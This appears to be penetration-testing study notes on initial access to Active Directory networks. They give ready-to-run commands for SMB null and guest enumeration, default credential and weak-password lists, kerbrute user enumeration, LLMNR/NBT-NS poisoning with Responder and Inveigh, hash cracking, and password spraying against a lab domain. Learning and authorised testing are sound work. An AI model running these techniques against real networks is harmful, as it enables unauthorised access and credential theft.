# Initial Access

After having access (eventually gained through pivoting after compromising a domain-joined host) to the network where the AD environment resides, you should enumerate all domain-joined hosts and their role in the AD environment. The main objective is to find the Domain Controller (DC) in order to move forward with the next enumeration steps.

To find hosts inside the AD environment:

* Ping sweep from linux: `fping -asgq 172.16.5.0/23`
* Scan the internal network using nmap

After that, there are several options to move forward:

1. Whenever possible, enumerate the SMB service and shares, checking for `NULL`, `guest` and SMB Common Credentials authentication
2. Enumerate existing users with kerbrute
3. If possible, enumerate password policies (requires valid credentials)
4. Leverage password spraying using Common AD Passwords
5. Leverage Responder (from Linux) or Inveigh (from Windows) to perform LLMNR/NTB-NS Poisoning

### **SMB NULL Session, Guest and Common Credentials Authentication**

* **Guest Authentication:** `enum4linux -a -u "guest" -p "" <DC IP>`
* **Guest Authentication:** `smbmap -u "guest" -p "" -P 445 -H <DC IP>`
* **Guest Authentication:** `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
* **NULL Session:** `smbclient -N -L //<FQDN/IP>`
* **NULL Session:** `crackmapexec smb <FQDN/IP> --shares -u '' -p ''`
* **NULL Session:** `smbmap -u "" -p "" -P 445 -H <DC IP>`
* **NULL Session:** `enum4linux -a -u "" -p "" <DC IP>`
* Check for other common SMB credentials, as listed below

### **Common SMB Credentials**

Source: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#possible-credentials)

| Common Username(s)   | Common Password                         |
| -------------------- | --------------------------------------- |
| (blank)              | (blank)                                 |
| guest                | (blank)                                 |
| Administrator, admin | (blank), password, administrator, admin |
| arcserve             | arcserve, backup                        |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
| backupexec, backup   | backupexec, backup, arcada              |
| test, lab, demo      | password, test, lab, demo               |

***

### **Active Directory Users Enumeration**

{% hint style="warning" %}
Before enumerating users, it's recommended to understand the naming convention in use. Many targets might be using the conventions found in these common wordlists for user enumeration: [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) and [jsmith2.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith2.txt) user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames/tree/master).
{% endhint %}

**Enumerate users with Kerbrute:**

* Get Kerbrute's precompiled binary: [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)
* Enumerate Users: `kerbrute userenum -d DOMAINNAME.EXAMPLE --dc 172.16.5.5 jsmith.txt -o valid_ad_users`

**Enumerate users with WindapSearch:**

* Get WindapSearch: `git clone https://github.com/ropnop/windapsearch.git`
* Enumerate Users: `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`

**Alternatives:**

* `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]`
* `rpcclient -U "" -N 172.16.5.5` followed by `enumdomuser`
* `crackmapexec smb 172.16.5.5 --users`

***

### **LLMNR/NTB-NS Poisoning**

* LLMNR/NTB-NS poisoning refers to a Man in the Middle(MITM) attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts.
* LLMNR and NBT-NS are Microsoft Windows components that serve as **alternate methods of host identification that can be used when DNS fails**.
* If a machine attempts to resolve a host, but DNS resolution fails, typically, **the machine will try to ask all other machines on the local network for the correct host address via LLMNR**.
* If LLMNR fails, then NBT-NS will be used

> Basically, the idea is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests.\
> This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host.\
> \
> We can spoof an authoritative name resolution source (a host that's supposed to belong in the network segment) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host.\
> If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password.\
> \
> The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host.\
> LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain.

**LLMNR/NTB-NS Poisoning from Linux with Responder:**

1. To start responder: `sudo responder -I ens224` where ens224 is the name of the network interface connected to the internal network where the AD environment resides
2. Results will be printed on screen while running, and saved inside the `/usr/share/responder/logs` directory
3. To crack an NTLMv2 hash with hashcat: `hashcat -m 5600 hashfile /usr/share/wordlists/rockyou.txt`

**LLMNR/NTB-NS Poisoning from Windows with Inveigh:**

1. Get Inveigh: `git clone https://github.com/Kevin-Robertson/Inveigh`
2. Use the following **Powershell** commands:
   * `Import-Module .\Inveigh.ps1`
   * `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
3. Alternatively, use the compiled version of Inveigh with `.\Inveigh.exe`

***

### **Password Policies Enumeration**

> Before performing password spraying, it's a good idea to enumerate the password policy in order to avoid locking out the target user's account.\
> This is also useful to find out the minimum password complexity requirements.

**Enumerate the Password Policy from Linux:**

1. CME with credentials: crackmapexec smb 172.16.5.5 -u validuser -p validpass --pass-pol
2. RPCClient with NULL Session: `rpcclient -U "" -N 172.16.5.5` followed by `querydominfo`
3. Enum4Linux: `enum4linux -P 172.16.5.5`
4. Enum4linux-ng with output to YAML and JSON: `enum4linux-ng -P 172.16.5.5 -oA outputfile`

**Enumerate the Password Policy from Windows:**

1. `net accounts`
2. Powerview: `Import-Module .\PowerView.ps1` followed by `Get-DomainPolicy`

***

### **Password Spraying**

> This attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses.\
> \
> The usernames and emails may have been gathered during the OSINT phase of the penetration test or during our initial enumeration attempts.

**Perform Password Spraying from Linux:**

1. Bash One-Liner using rpcclient:\
   `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
2. Using Kerbrute:\
   `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
3. Using CrackMapExec:\
   `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

**Perform Password Spraying from Windows:**

1. Using [CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray) (recommended):
   1. `Import-Module .\Invoke-CleverSpray.ps1`
   2. `Invoke-CleverSpray -Password "Password-To-Spray"`
2. Using [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray):
   1. `Import-Module .\DomainPasswordSpray.ps1`
   2. `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`

### **Common AD Users' Passwords**

* Welcome1, Welcome123
* Password123, Passw0rd, password1, Password1
* 123456, 12345678, qwerty, abc123, iloveyou,
